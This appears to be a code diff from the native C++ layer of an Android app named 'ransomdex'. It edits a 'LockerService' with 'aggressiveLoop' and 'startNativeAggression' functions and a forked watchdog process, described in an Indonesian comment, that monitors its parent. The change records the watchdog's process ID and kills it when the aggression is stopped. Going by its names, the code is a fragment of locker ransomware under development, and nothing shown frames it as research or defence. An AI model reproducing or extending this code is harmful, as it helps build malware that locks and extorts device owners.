@@ -47,7 +47,8 @@ void* aggressiveLoop(void* args) {
 }
 
 void startWatchdog(const char* cmd) {
-    pid_t pid = fork();
+    watchdogPid = fork();
+    pid_t pid = watchdogPid;
     if (pid == 0) { // Proses anak (Watchdog)
         pid_t ppid = getppid();
         while (true) {
@@ -82,6 +83,10 @@ Java_com_bondex_ransomdex_LockerService_startNativeAggression(JNIEnv* env, jobje
 extern "C" JNIEXPORT void JNICALL
 Java_com_bondex_ransomdex_LockerService_stopNativeAggression(JNIEnv* env, jobject thiz) {
     isRunning = false;
+    if (watchdogPid > 0) {
+        kill(watchdogPid, SIGKILL);
+        watchdogPid = -1;
+    }
     if (serviceObject != nullptr) {
         env->DeleteGlobalRef(serviceObject);
         serviceObject = nullptr;
